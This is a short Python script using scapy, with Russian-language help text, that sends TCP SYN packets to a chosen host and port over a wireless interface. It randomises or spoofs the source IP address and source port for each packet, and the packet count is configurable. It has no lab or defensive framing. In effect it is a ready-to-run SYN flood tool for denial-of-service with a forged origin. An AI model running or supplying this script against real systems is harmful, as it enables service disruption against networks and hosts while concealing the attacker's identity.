import argparse
import random
from scapy.all import IP, TCP, send

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def main():
    parser = argparse.ArgumentParser(
        description="Send TCP SYN packets over a wireless interface"
    )
    parser.add_argument(
        '--iface',
        default='wlan0',
        help="Имя беспроводного интерфейса (по умолчанию wlan0)"
    )
    parser.add_argument(
        '--dst',
        default='192.168.1.100',
        help="Целевой IP-адрес (по умолчанию 192.168.1.100)"
    )
    parser.add_argument(
        '--dport',
        type=int,
        default=80,
        help="Целевой порт (по умолчанию 80)"
    )
    parser.add_argument(
        '--count',
        type=int,
        default=200,
        help="Сколько SYN пакетов шлать (по умолчанию 200)"
    )
    parser.add_argument(
        '--src-ip',
        default=None,
        help="Подменить Source IP (по умолчанию рандом)"
    )
    parser.add_argument(
        '--src-port',
        type=int,
        default=0,
        help="Source port (0 = рандомить каждый раз)"
    )
    args = parser.parse_args()

    print(f"[*] Sending {args.count} SYNs to {args.dst}:{args.dport} via {args.iface}")

    for i in range(1, args.count + 1):
        ip_layer = IP(dst=args.dst)
        ip_layer.src = args.src_ip if args.src_ip else random_ip()

        sport = args.src_port if args.src_port else random.randint(1024, 65535)
        tcp_layer = TCP(
            sport=sport,
            dport=args.dport,
            flags="S",
            seq=random.randint(0, 2**32 - 1)
        )

        pkt = ip_layer / tcp_layer
        send(pkt, iface=args.iface, verbose=False)
        print(f"  [{i}/{args.count}] {ip_layer.src}:{sport} → {args.dst}:{args.dport}")

    print("[✓] Done.")

if __name__ == "__main__":
    main()
